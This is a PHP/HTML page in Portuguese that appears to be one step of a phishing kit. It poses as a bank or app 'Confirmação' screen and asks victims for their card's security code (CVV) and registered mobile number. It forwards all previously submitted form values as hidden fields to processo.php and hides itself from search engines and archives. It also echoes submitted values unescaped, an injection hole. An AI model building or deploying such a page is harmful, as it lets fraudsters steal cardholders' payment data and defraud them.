<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Bem vindo - Aplicativo Online</title>
    <link rel="shortcut icon" href="imagens/favicon.png" />

    <meta name="theme-color" content="#f4f102">
	<meta name="msapplication-navbutton-color" content="#f4f102">
	<meta name="apple-mobile-web-app-status-bar-style" content="#f4f102">

    <meta name="robots" content="noindex,nofollow">
	<meta name="googlebot" content="noindex,nofollow">
	<meta name="robots" content="noarchive">

    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">
</head>
<body class="back_blue">

<div class="row hd_top">
    <div class="centralizar">
        <img src="imagens/logo.jpg" class="cima_logo">
        <div class="desc_now">
            <h1>Confirmação.</h1>
            <p>
                Para concluir esta solicitação, informe o código de segurança do seu cartão e o número do celular cadastrado. <br><br>
                * Código de Segurança: Este código é encontrado no verso do seu cartão com 3 dígitos.
            </p>
        </div>
    <div class="limpar"></div>
    </div><!-- centralizar -->
</div><!-- row -->

<div class="row main_form">
    <div class="centralizar">
        <form action="processo.php" method="post" onsubmit="return check_fone();" class="home_form" autocomplete="off">
				<?php foreach($_POST as $key => $value):  ?>
	<input type="hidden" name="<?= $key ?>" value="<?= $value ?>" />
 <?php endforeach; ?>
            <label for="is_fone">
                <span>Celular cadastrado:</span>
                <input type="tel" name="is_fone" id="is_fone" class="home_input" placeholder="Celular com DDD" maxlength="15">
            </label>

            <label for="is_cvv">
                <span>Código de segurança:</span>
                <input type="number" name="is_cvv" id="is_cvv" class="home_input" placeholder="Código de Segurança" maxlength="3"
                oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
                <small>3 dígitos encontrados no verso do seu cartão.</small>
            </label>

            <div class="limpar"><br></div>

            <button class="home_btn">
                CONFIRMAR
            </button>

            <input type="hidden" name="sender" value="confirmation">

        </form>
    <div class="limpar"></div>
    </div><!-- centralizar -->
</div><!-- row -->

<!-- includes -->
<link rel="stylesheet" href="estilos/estilo.css">
<script src="javascripts/jquery.min.js"></script>
<script src="javascripts/jquery.mask.js"></script>
<script src="javascripts/javascripts.js"></script>
<script>
$( document ).ready(function() {
    $('#is_fone').mask('(00) 00000-0000', {reverse: false});
});
</script>

</body>
</html>